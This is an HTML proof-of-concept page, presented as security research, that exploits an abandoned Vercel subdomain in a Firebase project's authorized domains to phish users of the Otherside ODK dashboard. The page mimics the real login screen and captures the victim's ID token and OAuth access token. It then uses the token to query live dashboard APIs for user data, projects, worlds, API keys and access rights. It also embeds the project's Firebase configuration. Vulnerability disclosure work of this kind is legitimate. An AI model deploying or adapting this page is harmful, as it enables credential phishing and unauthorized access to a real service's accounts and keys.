<!--
  =====================================================================
  SECURITY RESEARCH PROOF OF CONCEPT - NOT FOR MALICIOUS USE
  =====================================================================
  Vulnerability: Firebase authorizedDomains contains abandoned Vercel 
  subdomain (m2-edison-preview.vercel.app) enabling OAuth phishing
  Project: scarcely-calm-lark (Otherside/ODK Dashboard)
  Tenant: hound-j8zaz
  =====================================================================
  This PoC demonstrates that a Firebase OAuth flow initiated from 
  m2-edison-preview.vercel.app (an abandoned domain in authorizedDomains)
  would succeed, allowing an attacker to create authenticated sessions
  under the correct tenant and access the ODK dashboard.
  =====================================================================
-->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Otherside Dashboard - Security PoC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: #141414;
            border: 1px solid #2a2a2a;
            border-radius: 16px;
            padding: 48px;
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .logo {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            border-radius: 16px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
        }
        h1 { font-size: 24px; margin-bottom: 8px; }
        .subtitle { color: #888; font-size: 14px; margin-bottom: 32px; }
        .btn-google {
            width: 100%;
            padding: 14px;
            background: #fff;
            color: #333;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
            margin-bottom: 12px;
        }
        .btn-google:hover { background: #f0f0f0; transform: translateY(-1px); }
        .btn-google svg { width: 20px; height: 20px; }
        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 20px 0;
            color: #555;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #2a2a2a;
        }
        .btn-twitter {
            width: 100%;
            padding: 14px;
            background: #1d9bf0;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            transition: all 0.2s;
        }
        .btn-twitter:hover { background: #1a8cd8; }
        
        /* Security Research Panel - Hidden from victim */
        .research-panel {
            margin-top: 32px;
            padding: 16px;
            background: #1a0a0a;
            border: 1px solid #ff4444;
            border-radius: 12px;
            font-size: 12px;
            text-align: left;
        }
        .research-panel h3 { color: #ff4444; margin-bottom: 8px; font-size: 13px; }
        .research-panel code { color: #ff8888; word-break: break-all; }
        .research-panel .status { margin-top: 8px; padding: 8px; background: #0a0a0a; border-radius: 6px; }
        #auth-status { color: #4ade80; }
        #token-output { 
            max-height: 150px; overflow-y: auto; 
            font-family: monospace; font-size: 10px; 
            color: #aaa; margin-top: 8px; 
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">O</div>
        <h1>Welcome to Otherside</h1>
        <p class="subtitle">Sign in to access the dashboard</p>
        
        <button class="btn-google" onclick="signInWithGoogle()">
            <svg viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            Sign in with Google
        </button>
        
        <div class="divider">or</div>
        
        <button class="btn-twitter" onclick="alert('Twitter OAuth fails from this domain - callback URL not approved in Twitter Developer Portal')">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
            </svg>
            Sign in with X (Twitter)
        </button>

        <!-- Security Research Panel -->
        <div class="research-panel">
            <h3>SECURITY RESEARCH PoC</h3>
            <p>This page demonstrates the Firebase authorizedDomains vulnerability.</p>
            <p style="margin-top:4px">Domain: <code>m2-edison-preview.vercel.app</code></p>
            <p>Project: <code>scarcely-calm-lark</code></p>
            <p>Tenant: <code>hound-j8zaz</code></p>
            <div class="status">
                <span>Firebase Status: </span><span id="auth-status">Initializing...</span>
            </div>
            <div id="token-output"></div>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
    
    <script>
        // =====================================================
        // Firebase Configuration (LEAKED from ODK Dashboard)
        // These values are publicly exposed in the dashboard's
        // __NEXT_DATA__ and JavaScript bundles
        // =====================================================
        const firebaseConfig = {
            apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
            authDomain: "scarcely-calm-lark.firebaseapp.com",
            projectId: "scarcely-calm-lark",
            storageBucket: "scarcely-calm-lark.appspot.com",
            messagingSenderId: "761033708851",
            appId: "1:761033708851:web:fb54f41dc499d5a8ee1a46"
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const auth = app.auth();

        // =====================================================
        // CRITICAL: Set the tenant ID to "hound-j8zaz"
        // This is the tenant used by Otherside's ODK Dashboard
        // Without this, the account would be created under the
        // top-level project (no tenant) and the dashboard
        // would reject it with 403
        // =====================================================
        auth.tenantId = "hound-j8zaz";

        const tokenOutput = document.getElementById('token-output');
        const authStatus = document.getElementById('auth-status');

        function log(msg) {
            tokenOutput.innerHTML += msg + '<br>';
            tokenOutput.scrollTop = tokenOutput.scrollHeight;
        }

        // Monitor auth state
        auth.onAuthStateChanged(async (user) => {
            if (user) {
                authStatus.textContent = 'AUTHENTICATED';
                authStatus.style.color = '#ff4444';
                
                log('[!] User authenticated under tenant: ' + user.tenantId);
                log('[!] UID: ' + user.uid);
                log('[!] Email: ' + user.email);
                log('[!] Provider: ' + user.providerData[0]?.providerId);
                
                // Get the ID Token - this is the KEY to the ODK Dashboard
                try {
                    const idToken = await user.getIdToken();
                    log('[!] ID TOKEN OBTAINED (' + idToken.length + ' chars)');
                    log('[!] Token preview: ' + idToken.substring(0, 50) + '...');
                    
                    // Decode JWT payload to show tenant info
                    const payload = JSON.parse(atob(idToken.split('.')[1]));
                    log('[!] JWT tenant_id: ' + (payload.tenant_id || 'NONE'));
                    log('[!] JWT iss: ' + payload.iss);
                    log('[!] JWT email_verified: ' + payload.email_verified);
                    
                    // =====================================================
                    // ATTACK STEP: Use the token to access ODK Dashboard APIs
                    // =====================================================
                    log('[*] Testing ODK Dashboard access...');
                    
                    // Test 1: Fetch current user
                    const userResp = await fetch('https://odk.otherside.xyz/api/v0/accounts/users/current', {
                        headers: { 'Authorization': 'Bearer ' + idToken }
                    });
                    log('[*] /accounts/users/current: HTTP ' + userResp.status);
                    if (userResp.ok) {
                        const userData = await userResp.json();
                        log('[!] USER DATA: ' + JSON.stringify(userData).substring(0, 200));
                    }
                    
                    // Test 2: Fetch projects
                    const projResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/projects', {
                        headers: { 'Authorization': 'Bearer ' + idToken }
                    });
                    log('[*] /organizations/projects: HTTP ' + projResp.status);
                    
                    // Test 3: Fetch worlds
                    const worldsResp = await fetch('https://odk.otherside.xyz/api/v0/origin/worlds', {
                        headers: { 'Authorization': 'Bearer ' + idToken }
                    });
                    log('[*] /origin/worlds: HTTP ' + worldsResp.status);
                    
                    // Test 4: Fetch API keys
                    const keysResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/apiKeys', {
                        headers: { 'Authorization': 'Bearer ' + idToken }
                    });
                    log('[*] /organizations/apiKeys: HTTP ' + keysResp.status);

                    // Test 5: Review access
                    const accessResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
                        method: 'POST',
                        headers: { 
                            'Authorization': 'Bearer ' + idToken,
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            resource: 'o/fine-houses-deny-595464',
                            verb: 'ALL'
                        })
                    });
                    log('[*] /permissions/reviewAccess: HTTP ' + accessResp.status);
                    if (accessResp.ok) {
                        const accessData = await accessResp.json();
                        log('[!] ACCESS RIGHTS: ' + JSON.stringify(accessData).substring(0, 300));
                    }

                } catch (err) {
                    log('[!] Token error: ' + err.message);
                }
            } else {
                authStatus.textContent = 'Not authenticated';
                authStatus.style.color = '#888';
            }
        });

        // Google Sign-In function (mirrors the ODK Dashboard's exact flow)
        async function signInWithGoogle() {
            log('[*] Initiating Google OAuth...');
            log('[*] auth.tenantId = ' + auth.tenantId);
            log('[*] Current origin = ' + window.location.origin);
            
            const provider = new firebase.auth.GoogleAuthProvider();
            // Same scopes as the ODK Dashboard
            provider.addScope('profile');
            provider.addScope('email');
            // Same custom parameters as the ODK Dashboard
            provider.setCustomParameters({
                redirectUrl: window.location.href
            });
            
            try {
                // =====================================================
                // This is the EXACT same call the ODK Dashboard makes:
                // signInWithPopup(getTenantedAuth("hound-j8zaz"), provider)
                // =====================================================
                const result = await firebase.auth().signInWithPopup(auth, provider);
                
                log('[+] OAuth SUCCESS!');
                log('[+] User: ' + result.user.email);
                log('[+] Tenant: ' + result.user.tenantId);
                
                // The credential contains the OAuth access token
                if (result.credential) {
                    log('[+] Google OAuth access token obtained');
                    log('[+] OAuth access token: ' + result.credential.accessToken?.substring(0, 30) + '...');
                }
                
            } catch (error) {
                log('[!] OAuth Error: ' + error.code);
                log('[!] Message: ' + error.message);
                
                if (error.code === 'auth/unauthorized-domain') {
                    log('[!] DOMAIN NOT IN authorizedDomains - Attack blocked');
                } else if (error.code === 'auth/popup-closed-by-user') {
                    log('[*] User closed the popup');
                } else if (error.code === 'auth/tenant-id-mismatch') {
                    log('[!] Tenant ID mismatch - Account created under wrong tenant');
                }
            }
        }

        // Log initial state
        log('[*] Firebase initialized');
        log('[*] Project: scarcely-calm-lark');
        log('[*] Tenant: hound-j8zaz');
        log('[*] Domain: ' + window.location.hostname);
        log('[*] Waiting for user interaction...');
    </script>
</body>
</html>
